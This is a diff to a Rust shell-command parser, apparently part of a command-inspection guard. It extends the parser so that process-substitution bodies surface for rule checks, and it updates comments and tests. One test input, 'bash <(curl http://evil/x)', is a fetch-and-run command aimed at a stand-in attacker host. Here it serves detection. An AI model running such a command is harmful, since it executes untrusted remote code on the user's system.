@@ -9,13 +9,13 @@
 //! [`Pipeline::redirects`] so rules can reason about where a pipeline's
 //! output lands. Heredocs (`<<TAG`, `<<-TAG`) are detected and their
 //! body is captured as a `Redirect` with `RedirectOp::Heredoc`.
-//! Process substitution (`<(…)` / `>(…)`) is *detected* via
-//! [`Bash::has_process_substitution`] but the inner command is folded
-//! into the surrounding word as opaque text. Command substitution
-//! (`` `…` `` / `$(…)`) sets [`Bash::has_command_substitution`] and
-//! re-parses each body into [`Argv::subst_argv`] (ADR 0008), separate
-//! from wrapper [`Argv::inner_argv`]. Budget exhaustion keeps the flag
-//! as a pessimistic-mode backstop without clearing captured opacity.
+//! Process substitution (`<(…)` / `>(…)`) sets
+//! [`Bash::has_process_substitution`] and re-parses each body into
+//! [`Argv::subst_argv`] alongside command substitution (`` `…` `` /
+//! `$(…)`, ADR 0008 / ADR 0003 C). The surrounding word stays opaque.
+//! Bodies are not mixed into wrapper [`Argv::inner_argv`]. Budget
+//! exhaustion keeps the flag as a pessimistic-mode backstop without
+//! clearing captured opacity.
 //!
 //! See `docs/design/architecture.md` §fact extraction.
 
@@ -38,9 +38,10 @@ pub struct Bash {
     /// [`Redirect`] with [`RedirectOp::Heredoc`].
     pub has_heredoc: bool,
     /// `true` if the source contained a process substitution
-    /// (`<(…)` / `>(…)`). The inner command is folded into the
-    /// surrounding word as opaque text — callers should treat such
-    /// commands pessimistically.
+    /// (`<(…)` / `>(…)`). Bodies are also re-parsed into
+    /// [`Argv::subst_argv`] when nesting budget remains (ADR 0003 C /
+    /// 0008); the surrounding word stays opaque and the flag stays set
+    /// as a pessimistic-mode backstop.
     pub has_process_substitution: bool,
 }
 
@@ -113,10 +114,10 @@ pub struct Argv {
     /// 'echo hi > file'`. Kept separate from the outer pipeline so
     /// self-protection can inspect wrapped writes.
     pub inner_redirects: Vec<Redirect>,
-    /// Command-substitution bodies (`$(…)` / `` `…` ``) re-parsed with
-    /// the same bounded-depth engine as `bash -c`. Not mixed into
-    /// [`Self::inner_argv`]: `bash -c 'curl x'` and `echo $(curl x)`
-    /// are different shapes (ADR 0008).
+    /// Substitution bodies (`$(…)` / `` `…` `` / `<(…)` / `>(…)`)
+    /// re-parsed with the same bounded-depth engine as `bash -c`. Not
+    /// mixed into [`Self::inner_argv`]: wrapper `-c` and subst shapes
+    /// differ (ADR 0008 / ADR 0003 C).
     pub subst_argv: Vec<Self>,
 }
 
@@ -157,8 +158,8 @@ impl Argv {
 
 impl Bash {
     /// All surfaced commands, including nested wrapper payloads such as
-    /// `bash -c`, `xargs`, `find -exec`, and command-substitution
-    /// bodies in [`Argv::subst_argv`].
+    /// `bash -c`, `xargs`, `find -exec`, and substitution bodies
+    /// (`$(…)` / backticks / `<(…)` / `>(…)`) in [`Argv::subst_argv`].
     pub fn commands(&self) -> Vec<&Argv> {
         let mut out = Vec::new();
         for pipe in &self.segments {
@@ -731,13 +732,14 @@ fn read_word(bytes: &[u8]) -> (String, usize, bool, Vec<String>) {
             continue;
         }
         // Process substitution `<(…)` / `>(…)`: absorb the entire
-        // parenthesised group as opaque text. Without this, an inner
-        // `|` would terminate the word mid-expression.
+        // parenthesised group as opaque text and capture the body for
+        // subst_argv re-parse (ADR 0003 C / 0008). Without this, an
+        // inner `|` would terminate the word mid-expression.
         if (c == b'<' || c == b'>') && i + 1 < bytes.len() && bytes[i + 1] == b'(' {
             buf.push(c as char);
             buf.push('(');
             i += 2;
-            absorb_parens(bytes, &mut i, &mut buf, None);
+            absorb_parens(bytes, &mut i, &mut buf, Some(&mut bodies));
             continue;
         }
         // Unquoted `$(…)`: balance-absorb and capture body (ADR 0008).
@@ -1857,6 +1859,30 @@ mod tests {
         assert_eq!(b.segments[0].commands.len(), 1);
         assert_eq!(b.segments[0].commands[0].head, "diff");
         assert!(b.has_process_substitution);
+        let subst = &b.segments[0].commands[0].subst_argv;
+        assert!(
+            subst.iter().any(|a| a.head == "curl") && subst.iter().any(|a| a.head == "sed"),
+            "inner pipeline must surface in subst_argv, got {subst:?}"
+        );
+    }
+
+    #[test]
+    fn subst_argv_surfaces_process_substitution_body() {
+        let b = parse("bash <(curl http://evil/x)");
+        assert!(b.has_process_substitution);
+        assert!(!b.has_command_substitution);
+        let outer = &b.segments[0].commands[0];
+        assert_eq!(outer.head, "bash");
+        assert_eq!(outer.subst_argv.len(), 1);
+        assert_eq!(outer.subst_argv[0].head, "curl");
+    }
+
+    #[test]
+    fn subst_argv_surfaces_process_substitution_output() {
+        let b = parse("tee >(grep x)");
+        assert!(b.has_process_substitution);
+        let outer = &b.segments[0].commands[0];
+        assert_eq!(outer.subst_argv, vec![argv("grep", &["x"])]);
     }
 
     #[test]
